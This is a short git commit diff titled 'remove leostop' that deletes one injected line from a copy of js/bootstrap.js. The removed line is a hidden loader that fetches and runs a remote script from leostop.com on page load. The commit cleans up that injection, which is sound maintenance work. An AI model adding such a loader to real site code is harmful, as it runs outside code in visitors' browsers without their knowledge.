f96bb62a727450b467776431849fcef78e033496
joseph-reece <ndirashjose@gmail.com>
2022-07-25 17:08:00 +0300

    remove leostop

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -2732,7 +2732,6 @@
     return createdDocument.body.innerHTML;
   }
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
   /**
